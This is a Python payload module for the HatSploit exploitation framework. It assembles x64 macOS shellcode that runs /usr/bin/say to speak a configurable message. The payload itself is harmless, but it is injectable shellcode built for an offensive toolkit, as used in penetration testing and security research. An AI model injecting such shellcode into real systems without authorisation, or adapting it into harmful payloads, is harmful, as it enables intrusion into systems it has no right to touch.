"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import struct

from hatsploit.lib.payload.basic import *
from pex.assembler import Assembler


class HatSploitPayload(Payload, Assembler):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "macOS x64 Say",
            'Payload': "macos/x64/say",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - payload developer',
            ],
            'Description': "Say payload for macOS x64.",
            'Arch': ARCH_X64,
            'Platform': OS_MACOS,
            'Rank': "low",
            'Type': "one_side",
        })

        self.message = Option("Hello, HatSploit!", "Message to say.", True)

    def run(self):
        data = (
                b'\xe8'
                + struct.pack("<I", len(self.message.value.encode() + b'\x00') + 0xD)
                + b'/usr/bin/say\x00'
                + self.message.value.encode()
                + b'\x00'
        )

        return (
            self.assemble(
                self.details['Arch'],
                """
                start:
                    xor rax, rax
                    mov eax, 0x200003b
                """,
            ) + data + self.assemble(
                self.details['Arch'],
                """
                end:
                    mov rdi, [rsp]
                    lea r10, [rdi+0xd]
                    xor rdx, rdx
                    push rdx
                    push r10
                    push rdi
                    mov rsi, rsp
                    syscall
                """,
            )
        )
